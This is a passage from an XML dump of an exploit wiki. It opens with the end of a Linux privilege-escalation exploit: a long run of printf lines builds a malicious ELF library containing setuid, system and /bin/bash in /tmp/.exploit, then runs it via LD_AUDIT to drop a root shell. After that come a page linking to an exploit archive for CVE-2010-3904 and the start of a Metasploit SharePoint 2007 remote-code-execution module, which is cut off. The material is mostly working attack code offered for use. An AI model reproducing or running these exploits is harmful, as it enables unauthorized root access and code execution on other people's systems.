printf "\314\024\000\000\300\000\000\000\300\000\000\000\006\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\121\345\164\144\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\000\000\000\000\006\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\003\000\000\000\006\000\000\000\002\000\000\000" &gt;&gt;/tmp/.exploit
printf "\006\000\000\000\210\000\040\001\000\304\120\013\006\000\000\000" &gt;&gt;/tmp/.exploit
printf "\010\000\000\000\013\000\000\000\272\343\222\174\103\105\325\354" &gt;&gt;/tmp/.exploit
printf "\330\161\130\034\070\205\230\174\271\215\361\016\353\323\357\016" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\001\000\000\000\000\000\000\000\000\000\000\000\040\000\000\000" &gt;&gt;/tmp/.exploit
printf "\053\000\000\000\000\000\000\000\000\000\000\000\040\000\000\000" &gt;&gt;/tmp/.exploit
printf "\106\000\000\000\000\000\000\000\175\000\000\000\022\000\000\000" &gt;&gt;/tmp/.exploit
printf "\077\000\000\000\000\000\000\000\145\000\000\000\022\000\000\000" &gt;&gt;/tmp/.exploit
printf "\034\000\000\000\000\000\000\000\132\001\000\000\042\000\000\000" &gt;&gt;/tmp/.exploit
printf "\152\000\000\000\274\025\000\000\000\000\000\000\020\000\361\377" &gt;&gt;/tmp/.exploit
printf "\127\000\000\000\264\025\000\000\000\000\000\000\020\000\361\377" &gt;&gt;/tmp/.exploit
printf "\136\000\000\000\264\025\000\000\000\000\000\000\020\000\361\377" &gt;&gt;/tmp/.exploit
printf "\021\000\000\000\034\004\000\000\062\000\000\000\022\000\012\000" &gt;&gt;/tmp/.exploit
printf "\020\000\000\000\310\002\000\000\000\000\000\000\022\000\010\000" &gt;&gt;/tmp/.exploit
printf "\026\000\000\000\204\004\000\000\000\000\000\000\022\000\013\000" &gt;&gt;/tmp/.exploit
printf "\000\137\137\147\155\157\156\137\163\164\141\162\164\137\137\000" &gt;&gt;/tmp/.exploit
printf "\137\151\156\151\164\000\137\146\151\156\151\000\137\137\143\170" &gt;&gt;/tmp/.exploit
printf "\141\137\146\151\156\141\154\151\172\145\000\137\112\166\137\122" &gt;&gt;/tmp/.exploit
printf "\145\147\151\163\164\145\162\103\154\141\163\163\145\163\000\163" &gt;&gt;/tmp/.exploit
printf "\145\164\165\151\144\000\163\171\163\164\145\155\000\154\151\142" &gt;&gt;/tmp/.exploit
printf "\143\056\163\157\056\066\000\137\145\144\141\164\141\000\137\137" &gt;&gt;/tmp/.exploit
printf "\142\163\163\137\163\164\141\162\164\000\137\145\156\144\000\107" &gt;&gt;/tmp/.exploit
printf "\114\111\102\103\137\062\056\061\056\063\000\107\114\111\102\103" &gt;&gt;/tmp/.exploit
printf "\137\062\056\060\000\000\000\000\000\000\000\000\002\000\002\000" &gt;&gt;/tmp/.exploit
printf "\003\000\001\000\001\000\001\000\001\000\001\000\001\000\000\000" &gt;&gt;/tmp/.exploit
printf "\001\000\002\000\115\000\000\000\020\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\163\037\151\011\000\000\003\000\157\000\000\000\020\000\000\000" &gt;&gt;/tmp/.exploit
printf "\020\151\151\015\000\000\002\000\173\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\310\024\000\000\010\000\000\000\264\024\000\000\001\011\000\000" &gt;&gt;/tmp/.exploit
printf "\214\025\000\000\006\001\000\000\220\025\000\000\006\002\000\000" &gt;&gt;/tmp/.exploit
printf "\224\025\000\000\006\005\000\000\244\025\000\000\007\001\000\000" &gt;&gt;/tmp/.exploit
printf "\250\025\000\000\007\003\000\000\254\025\000\000\007\004\000\000" &gt;&gt;/tmp/.exploit
printf "\260\025\000\000\007\005\000\000\125\211\345\203\354\010\350\135" &gt;&gt;/tmp/.exploit
printf "\000\000\000\350\010\001\000\000\350\163\001\000\000\311\303\000" &gt;&gt;/tmp/.exploit
printf "\377\263\004\000\000\000\377\243\010\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\377\243\014\000\000\000\150\000\000\000\000\351\340\377\377\377" &gt;&gt;/tmp/.exploit
printf "\377\243\020\000\000\000\150\010\000\000\000\351\320\377\377\377" &gt;&gt;/tmp/.exploit
printf "\377\243\024\000\000\000\150\020\000\000\000\351\300\377\377\377" &gt;&gt;/tmp/.exploit
printf "\377\243\030\000\000\000\150\030\000\000\000\351\260\377\377\377" &gt;&gt;/tmp/.exploit
printf "\125\211\345\123\203\354\004\350\000\000\000\000\133\201\303\134" &gt;&gt;/tmp/.exploit
printf "\022\000\000\213\223\364\377\377\377\205\322\164\005\350\236\377" &gt;&gt;/tmp/.exploit
printf "\377\377\130\133\311\303\220\220\220\220\220\220\220\220\220\220" &gt;&gt;/tmp/.exploit
printf "\125\211\345\126\123\350\255\000\000\000\201\303\056\022\000\000" &gt;&gt;/tmp/.exploit
printf "\203\354\020\200\273\040\000\000\000\000\165\127\213\203\374\377" &gt;&gt;/tmp/.exploit
printf "\377\377\205\300\164\016\215\203\060\377\377\377\211\004\044\350" &gt;&gt;/tmp/.exploit
printf "\214\377\377\377\215\203\050\377\377\377\215\223\044\377\377\377" &gt;&gt;/tmp/.exploit
printf "\051\320\301\370\002\215\160\377\213\203\034\000\000\000\071\306" &gt;&gt;/tmp/.exploit
printf "\166\032\203\300\001\211\203\034\000\000\000\377\224\203\044\377" &gt;&gt;/tmp/.exploit
printf "\377\377\213\203\034\000\000\000\071\306\167\346\306\203\040\000" &gt;&gt;/tmp/.exploit
printf "\000\000\001\203\304\020\133\136\135\303\215\266\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\125\211\345\123\350\056\000\000\000\201\303\257\021\000\000\203" &gt;&gt;/tmp/.exploit
printf "\354\004\213\223\054\377\377\377\205\322\164\025\213\223\370\377" &gt;&gt;/tmp/.exploit
printf "\377\377\205\322\164\013\215\203\054\377\377\377\211\004\044\377" &gt;&gt;/tmp/.exploit
printf "\322\203\304\004\133\135\303\213\034\044\303\220\125\211\345\123" &gt;&gt;/tmp/.exploit
printf "\203\354\004\350\357\377\377\377\201\303\160\021\000\000\307\004" &gt;&gt;/tmp/.exploit
printf "\044\000\000\000\000\350\326\376\377\377\215\203\010\357\377\377" &gt;&gt;/tmp/.exploit
printf "\211\004\044\350\270\376\377\377\203\304\004\133\135\303\220\220" &gt;&gt;/tmp/.exploit
printf "\125\211\345\126\123\350\275\377\377\377\201\303\076\021\000\000" &gt;&gt;/tmp/.exploit
printf "\215\203\040\377\377\377\215\160\374\213\100\374\203\370\377\164" &gt;&gt;/tmp/.exploit
printf "\014\203\356\004\377\320\213\006\203\370\377\165\364\133\136\135" &gt;&gt;/tmp/.exploit
printf "\303\220\220\220\125\211\345\123\203\354\004\350\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\133\201\303\010\021\000\000\350\304\376\377\377\131\133\311\303" &gt;&gt;/tmp/.exploit
printf "\057\142\151\156\057\142\141\163\150\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\377\377\377\377\000\000\000\000\000\000\000\000\377\377\377\377" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\310\024\000\000\001\000\000\000" &gt;&gt;/tmp/.exploit
printf "\115\000\000\000\014\000\000\000\310\002\000\000\015\000\000\000" &gt;&gt;/tmp/.exploit
printf "\204\004\000\000\365\376\377\157\264\000\000\000\005\000\000\000" &gt;&gt;/tmp/.exploit
printf "\260\001\000\000\006\000\000\000\360\000\000\000\012\000\000\000" &gt;&gt;/tmp/.exploit
printf "\205\000\000\000\013\000\000\000\020\000\000\000\003\000\000\000" &gt;&gt;/tmp/.exploit
printf "\230\025\000\000\002\000\000\000\040\000\000\000\024\000\000\000" &gt;&gt;/tmp/.exploit
printf "\021\000\000\000\027\000\000\000\250\002\000\000\021\000\000\000" &gt;&gt;/tmp/.exploit
printf "\200\002\000\000\022\000\000\000\050\000\000\000\023\000\000\000" &gt;&gt;/tmp/.exploit
printf "\010\000\000\000\376\377\377\157\120\002\000\000\377\377\377\157" &gt;&gt;/tmp/.exploit
printf "\001\000\000\000\360\377\377\157\066\002\000\000\372\377\377\157" &gt;&gt;/tmp/.exploit
printf "\001\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\314\024\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\366\002\000\000\006\003\000\000\026\003\000\000" &gt;&gt;/tmp/.exploit
printf "\046\003\000\000\000\107\103\103\072\040\050\107\116\125\051\040" &gt;&gt;/tmp/.exploit
printf "\064\056\061\056\062\040\062\060\060\070\060\067\060\064\040\050" &gt;&gt;/tmp/.exploit
printf "\122\145\144\040\110\141\164\040\064\056\061\056\062\055\065\065" &gt;&gt;/tmp/.exploit
printf "\051\000\000\107\103\103\072\040\050\107\116\125\051\040\064\056" &gt;&gt;/tmp/.exploit
printf "\061\056\062\040\062\060\060\070\060\067\060\064\040\050\122\145" &gt;&gt;/tmp/.exploit
printf "\144\040\110\141\164\040\064\056\061\056\062\055\065\065\051\000" &gt;&gt;/tmp/.exploit
printf "\000\107\103\103\072\040\050\107\116\125\051\040\064\056\061\056" &gt;&gt;/tmp/.exploit
printf "\062\040\062\060\060\070\060\067\060\064\040\050\122\145\144\040" &gt;&gt;/tmp/.exploit
printf "\110\141\164\040\064\056\061\056\062\055\065\065\051\000\000\107" &gt;&gt;/tmp/.exploit
printf "\103\103\072\040\050\107\116\125\051\040\064\056\061\056\062\040" &gt;&gt;/tmp/.exploit
printf "\062\060\060\070\060\067\060\064\040\050\122\145\144\040\110\141" &gt;&gt;/tmp/.exploit
printf "\164\040\064\056\061\056\062\055\065\065\051\000\000\107\103\103" &gt;&gt;/tmp/.exploit
printf "\072\040\050\107\116\125\051\040\064\056\061\056\062\040\062\060" &gt;&gt;/tmp/.exploit
printf "\060\070\060\067\060\064\040\050\122\145\144\040\110\141\164\040" &gt;&gt;/tmp/.exploit
printf "\064\056\061\056\062\055\065\065\051\000\000\056\163\171\155\164" &gt;&gt;/tmp/.exploit
printf "\141\142\000\056\163\164\162\164\141\142\000\056\163\150\163\164" &gt;&gt;/tmp/.exploit
printf "\162\164\141\142\000\056\147\156\165\056\150\141\163\150\000\056" &gt;&gt;/tmp/.exploit
printf "\144\171\156\163\171\155\000\056\144\171\156\163\164\162\000\056" &gt;&gt;/tmp/.exploit
printf "\147\156\165\056\166\145\162\163\151\157\156\000\056\147\156\165" &gt;&gt;/tmp/.exploit
printf "\056\166\145\162\163\151\157\156\137\162\000\056\162\145\154\056" &gt;&gt;/tmp/.exploit
printf "\144\171\156\000\056\162\145\154\056\160\154\164\000\056\151\156" &gt;&gt;/tmp/.exploit
printf "\151\164\000\056\164\145\170\164\000\056\146\151\156\151\000\056" &gt;&gt;/tmp/.exploit
printf "\162\157\144\141\164\141\000\056\145\150\137\146\162\141\155\145" &gt;&gt;/tmp/.exploit
printf "\000\056\143\164\157\162\163\000\056\144\164\157\162\163\000\056" &gt;&gt;/tmp/.exploit
printf "\152\143\162\000\056\144\141\164\141\056\162\145\154\056\162\157" &gt;&gt;/tmp/.exploit
printf "\000\056\144\171\156\141\155\151\143\000\056\147\157\164\000\056" &gt;&gt;/tmp/.exploit
printf "\147\157\164\056\160\154\164\000\056\142\163\163\000\056\143\157" &gt;&gt;/tmp/.exploit
printf "\155\155\145\156\164\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\033\000\000\000\366\377\377\157\002\000\000\000\264\000\000\000" &gt;&gt;/tmp/.exploit
printf "\264\000\000\000\074\000\000\000\002\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\004\000\000\000\045\000\000\000\013\000\000\000" &gt;&gt;/tmp/.exploit
printf "\002\000\000\000\360\000\000\000\360\000\000\000\300\000\000\000" &gt;&gt;/tmp/.exploit
printf "\003\000\000\000\001\000\000\000\004\000\000\000\020\000\000\000" &gt;&gt;/tmp/.exploit
printf "\055\000\000\000\003\000\000\000\002\000\000\000\260\001\000\000" &gt;&gt;/tmp/.exploit
printf "\260\001\000\000\205\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\001\000\000\000\000\000\000\000\065\000\000\000\377\377\377\157" &gt;&gt;/tmp/.exploit
printf "\002\000\000\000\066\002\000\000\066\002\000\000\030\000\000\000" &gt;&gt;/tmp/.exploit
printf "\002\000\000\000\000\000\000\000\002\000\000\000\002\000\000\000" &gt;&gt;/tmp/.exploit
printf "\102\000\000\000\376\377\377\157\002\000\000\000\120\002\000\000" &gt;&gt;/tmp/.exploit
printf "\120\002\000\000\060\000\000\000\003\000\000\000\001\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\000\000\000\000\121\000\000\000\011\000\000\000" &gt;&gt;/tmp/.exploit
printf "\002\000\000\000\200\002\000\000\200\002\000\000\050\000\000\000" &gt;&gt;/tmp/.exploit
printf "\002\000\000\000\000\000\000\000\004\000\000\000\010\000\000\000" &gt;&gt;/tmp/.exploit
printf "\132\000\000\000\011\000\000\000\002\000\000\000\250\002\000\000" &gt;&gt;/tmp/.exploit
printf "\250\002\000\000\040\000\000\000\002\000\000\000\011\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\010\000\000\000\143\000\000\000\001\000\000\000" &gt;&gt;/tmp/.exploit
printf "\006\000\000\000\310\002\000\000\310\002\000\000\027\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\004\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\136\000\000\000\001\000\000\000\006\000\000\000\340\002\000\000" &gt;&gt;/tmp/.exploit
printf "\340\002\000\000\120\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\004\000\000\000\151\000\000\000\001\000\000\000" &gt;&gt;/tmp/.exploit
printf "\006\000\000\000\060\003\000\000\060\003\000\000\124\001\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\020\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\157\000\000\000\001\000\000\000\006\000\000\000\204\004\000\000" &gt;&gt;/tmp/.exploit
printf "\204\004\000\000\034\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\000\000\000\000\165\000\000\000\001\000\000\000" &gt;&gt;/tmp/.exploit
printf "\002\000\000\000\240\004\000\000\240\004\000\000\012\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\001\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\175\000\000\000\001\000\000\000\002\000\000\000\254\004\000\000" &gt;&gt;/tmp/.exploit
printf "\254\004\000\000\004\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\000\000\000\000\207\000\000\000\001\000\000\000" &gt;&gt;/tmp/.exploit
printf "\003\000\000\000\260\024\000\000\260\004\000\000\014\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\004\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\216\000\000\000\001\000\000\000\003\000\000\000\274\024\000\000" &gt;&gt;/tmp/.exploit
printf "\274\004\000\000\010\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\000\000\000\000\225\000\000\000\001\000\000\000" &gt;&gt;/tmp/.exploit
printf "\003\000\000\000\304\024\000\000\304\004\000\000\004\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\004\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\232\000\000\000\001\000\000\000\003\000\000\000\310\024\000\000" &gt;&gt;/tmp/.exploit
printf "\310\004\000\000\004\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\000\000\000\000\247\000\000\000\006\000\000\000" &gt;&gt;/tmp/.exploit
printf "\003\000\000\000\314\024\000\000\314\004\000\000\300\000\000\000" &gt;&gt;/tmp/.exploit
printf "\003\000\000\000\000\000\000\000\004\000\000\000\010\000\000\000" &gt;&gt;/tmp/.exploit
printf "\260\000\000\000\001\000\000\000\003\000\000\000\214\025\000\000" &gt;&gt;/tmp/.exploit
printf "\214\005\000\000\014\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\004\000\000\000\265\000\000\000\001\000\000\000" &gt;&gt;/tmp/.exploit
printf "\003\000\000\000\230\025\000\000\230\005\000\000\034\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\004\000\000\000\004\000\000\000" &gt;&gt;/tmp/.exploit
printf "\276\000\000\000\010\000\000\000\003\000\000\000\264\025\000\000" &gt;&gt;/tmp/.exploit
printf "\264\005\000\000\010\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\000\000\000\000\303\000\000\000\001\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\264\005\000\000\346\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\001\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\021\000\000\000\003\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\232\006\000\000\314\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\001\000\000\000\000\000\000\000\001\000\000\000\002\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\170\013\000\000\140\003\000\000" &gt;&gt;/tmp/.exploit
printf "\031\000\000\000\053\000\000\000\004\000\000\000\020\000\000\000" &gt;&gt;/tmp/.exploit
printf "\011\000\000\000\003\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\330\016\000\000\241\001\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\001\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\000\000\000\000\000\000\000\000\264\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\001\000\000\000\000\000\360\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\002\000\000\000\000\000\260\001\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\003\000\000\000\000\000\066\002\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\004\000\000\000\000\000\120\002\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\005\000\000\000\000\000\200\002\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\006\000\000\000\000\000\250\002\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\007\000\000\000\000\000\310\002\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\010\000\000\000\000\000\340\002\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\011\000\000\000\000\000\060\003\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\012\000\000\000\000\000\204\004\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\013\000\000\000\000\000\240\004\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\014\000\000\000\000\000\254\004\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\015\000\000\000\000\000\260\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\016\000\000\000\000\000\274\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\017\000\000\000\000\000\304\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\020\000\000\000\000\000\310\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\021\000\000\000\000\000\314\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\022\000\000\000\000\000\214\025\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\023\000\000\000\000\000\230\025\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\024\000\000\000\000\000\264\025\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\025\000\000\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\003\000\026\000\001\000\000\000\060\003\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\002\000\012\000\021\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\004\000\361\377\034\000\000\000\260\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\001\000\016\000\052\000\000\000\274\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\001\000\017\000\070\000\000\000\304\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\001\000\020\000\105\000\000\000\264\025\000\000" &gt;&gt;/tmp/.exploit
printf "\004\000\000\000\001\000\025\000\123\000\000\000\270\025\000\000" &gt;&gt;/tmp/.exploit
printf "\001\000\000\000\001\000\025\000\142\000\000\000\140\003\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\002\000\012\000\170\000\000\000\340\003\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\002\000\012\000\021\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\004\000\361\377\204\000\000\000\270\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\001\000\016\000\221\000\000\000\254\004\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\001\000\015\000\237\000\000\000\304\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\001\000\020\000\253\000\000\000\120\004\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\002\000\012\000\301\000\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\004\000\361\377\305\000\000\000\230\025\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\001\002\361\377\333\000\000\000\310\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\001\002\021\000\350\000\000\000\300\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\001\002\017\000\365\000\000\000\027\004\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\002\002\012\000\014\001\000\000\314\024\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\001\002\361\377\025\001\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\040\000\000\000\044\001\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\040\000\000\000\070\001\000\000\204\004\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\022\000\013\000\076\001\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\175\000\000\000\022\000\000\000\120\001\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\145\000\000\000\022\000\000\000\142\001\000\000\264\025\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\020\000\361\377\156\001\000\000\274\025\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\020\000\361\377\163\001\000\000\034\004\000\000" &gt;&gt;/tmp/.exploit
printf "\062\000\000\000\022\000\012\000\170\001\000\000\264\025\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\020\000\361\377\177\001\000\000\000\000\000\000" &gt;&gt;/tmp/.exploit
printf "\132\001\000\000\042\000\000\000\233\001\000\000\310\002\000\000" &gt;&gt;/tmp/.exploit
printf "\000\000\000\000\022\000\010\000\000\143\141\154\154\137\147\155" &gt;&gt;/tmp/.exploit
printf "\157\156\137\163\164\141\162\164\000\143\162\164\163\164\165\146" &gt;&gt;/tmp/.exploit
printf "\146\056\143\000\137\137\103\124\117\122\137\114\111\123\124\137" &gt;&gt;/tmp/.exploit
printf "\137\000\137\137\104\124\117\122\137\114\111\123\124\137\137\000" &gt;&gt;/tmp/.exploit
printf "\137\137\112\103\122\137\114\111\123\124\137\137\000\144\164\157" &gt;&gt;/tmp/.exploit
printf "\162\137\151\144\170\056\065\067\071\063\000\143\157\155\160\154" &gt;&gt;/tmp/.exploit
printf "\145\164\145\144\056\065\067\071\061\000\137\137\144\157\137\147" &gt;&gt;/tmp/.exploit
printf "\154\157\142\141\154\137\144\164\157\162\163\137\141\165\170\000" &gt;&gt;/tmp/.exploit
printf "\146\162\141\155\145\137\144\165\155\155\171\000\137\137\103\124" &gt;&gt;/tmp/.exploit
printf "\117\122\137\105\116\104\137\137\000\137\137\106\122\101\115\105" &gt;&gt;/tmp/.exploit
printf "\137\105\116\104\137\137\000\137\137\112\103\122\137\105\116\104" &gt;&gt;/tmp/.exploit
printf "\137\137\000\137\137\144\157\137\147\154\157\142\141\154\137\143" &gt;&gt;/tmp/.exploit
printf "\164\157\162\163\137\141\165\170\000\160\056\143\000\137\107\114" &gt;&gt;/tmp/.exploit
printf "\117\102\101\114\137\117\106\106\123\105\124\137\124\101\102\114" &gt;&gt;/tmp/.exploit
printf "\105\137\000\137\137\144\163\157\137\150\141\156\144\154\145\000" &gt;&gt;/tmp/.exploit
printf "\137\137\104\124\117\122\137\105\116\104\137\137\000\137\137\151" &gt;&gt;/tmp/.exploit
printf "\066\070\066\056\147\145\164\137\160\143\137\164\150\165\156\153" &gt;&gt;/tmp/.exploit
printf "\056\142\170\000\137\104\131\116\101\115\111\103\000\137\137\147" &gt;&gt;/tmp/.exploit
printf "\155\157\156\137\163\164\141\162\164\137\137\000\137\112\166\137" &gt;&gt;/tmp/.exploit
printf "\122\145\147\151\163\164\145\162\103\154\141\163\163\145\163\000" &gt;&gt;/tmp/.exploit
printf "\137\146\151\156\151\000\163\171\163\164\145\155\100\100\107\114" &gt;&gt;/tmp/.exploit
printf "\111\102\103\137\062\056\060\000\163\145\164\165\151\144\100\100" &gt;&gt;/tmp/.exploit
printf "\107\114\111\102\103\137\062\056\060\000\137\137\142\163\163\137" &gt;&gt;/tmp/.exploit
printf "\163\164\141\162\164\000\137\145\156\144\000\151\156\151\164\000" &gt;&gt;/tmp/.exploit
printf "\137\145\144\141\164\141\000\137\137\143\170\141\137\146\151\156" &gt;&gt;/tmp/.exploit
printf "\141\154\151\172\145\100\100\107\114\111\102\103\137\062\056\061" &gt;&gt;/tmp/.exploit
ls -l /tmp/.exploit

echo "Shell coming..."
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3

&lt;/pre&gt;</text>
      <sha1>dr2c73d3ogpkcz9noxira57yzpdw69f</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-3904 Linux kernel before 2.6.36特權提升漏洞</title>
    <ns>0</ns>
    <id>708</id>
    <revision>
      <id>948</id>
      <timestamp>2021-04-03T05:58:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2010-3904.zip"</comment>
      <origin>948</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="g35okbchnic76vxp9vb9vwd9rnj7nsn" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2010-3904.zip</text>
      <sha1>g35okbchnic76vxp9vb9vwd9rnj7nsn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-3964 Microsoft Office SharePoint Server 2007 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>2783</id>
    <revision>
      <id>3284</id>
      <timestamp>2021-05-26T01:09:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for m..."</comment>
      <origin>3284</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7103" sha1="9xfkme84g0rt7w7i9nyk69l1u8tqwz4" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize
    super(
      'Name'        =&gt; 'Microsoft Office SharePoint Server 2007 Remote Code Execution',
      'Description'    =&gt; %q{
          This module exploits a vulnerability found in SharePoint Server 2007 SP2. The
        software contains a directory traversal, that allows a remote attacker to write
        arbitrary files to the filesystem, sending a specially crafted SOAP ConvertFile
        request to the Office Document Conversions Launcher Service, which results in code
        execution under the context of 'SYSTEM'.

